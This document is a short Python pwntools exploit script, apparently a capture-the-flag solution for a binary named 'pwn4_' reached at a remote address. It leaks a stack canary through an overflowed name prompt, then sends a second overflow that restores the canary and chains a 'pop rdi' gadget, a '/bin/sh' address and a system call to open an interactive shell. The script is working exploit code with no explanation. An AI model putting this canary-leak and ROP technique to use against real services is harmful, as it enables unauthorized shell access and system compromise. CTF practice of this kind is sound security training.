#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
#p = process('./pwn4_')
p = remote('114.67.246.176',10031)
pop_rdi = 0x0000000000400963
binsh = 0x0000000000601068
sys = 0x000000000040080C
payload = 'a' * (0x240 - 8)
p.sendlineafter('Please leave your name(Within 36 Length):', payload)
p.recvline()
canary = p.recv(7).rjust(8, '\x00')
#log.success('canary ---> : ' + canary)
print(canary)
payload1 = 'a' * (0x210 - 8) + canary + 'junkjunk' + p64(pop_rdi) + p64(binsh) + p64(sys)
p.sendafter('Please leave a message(Within 0x200 Length):' , payload1)
p.interactive()
